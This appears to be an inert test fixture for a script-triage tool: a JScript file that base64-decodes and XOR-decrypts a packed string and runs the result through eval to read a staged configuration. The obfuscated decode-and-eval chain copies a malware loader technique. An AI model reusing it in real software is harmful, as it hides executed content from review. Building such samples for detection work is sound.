// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
function decode_374c5f6f(s) {
  var keyBytes = [86,106,111,179,197];
  var d = [];
  for (var i = 0; i < s.length; i++) { d.push(s[i] ^ keyBytes[i % keyBytes.length]); }
  return d;
}
function recover_105ad326() {
  var packedText = "LUgcx6AmGU2JnnQLDMKwPxgK7LczBwDHoHRGTcS3Px4K7KM/BgqR6XQOBsC1Nx4M25omGADQoCUZTZ/nPgsB16owDDDApiQDH8fnC0ZN0qE3GhvWt3RQTf6sNRgAwKowHkHriBoiO+eVdEZNx" + "aQ6HwrA52wRTdCkOxoO2qI4NQbX52xIDNKoJgsG1Kt7XguK9DdSX4ShNUhDkbAkBk2J5z4eG8O2bEVAh6FvWw6L9WEODJ2gLgsCw6kzRAbdszcGBtfqMghWiqBhXVqdoTceTZ/nIxkKwZo3DQ" + "rdsXRQTfuwOB4d1rYlJg7R6mIOVoKkblpY16Z0Rk3VrDoPMMOkIgJNiecVUDPvkCUPHcCZCjoa0ak/CTPvjSMEG8GgJRkj0qcKNhzHpDEPQoehb1sOi/VhDgydoTceTZ/nJA8I2rYiGBbstTc" + "eB5H/dCIk8JAKNjzcoyIdDsGgCjYnxqsiGArAthoLDe+ZEgMcw6olCw3foAo2W9f8ZwtXg/IyCU2f5zgPF8eaJR4O1KB0UE3BoCUFGsGmM0cc0qgmBgqdtSVbTc7pdBkb0qIzKQDGqyJIVYe4";
  var s = decodeBase64(packedText);
  var n = (19 * 7) - 133;
  var d = decode_374c5f6f.apply(null, [s]);
  var t;
  t = d.length ? String.fromCharCode(d[0]) : "";
  for (var bi = 1; bi < d.length; bi++) { t = t.concat(String.fromCharCode(d[bi])); }
  return t;
}
function inspect_f1b2e2b9() {
  var o = eval("(" + recover_105ad326.apply(null, []) + ")");
  return { steps: o.steps, adapter: o["adapter"], values: o.values, stageCount: o["stageCount"] };
}
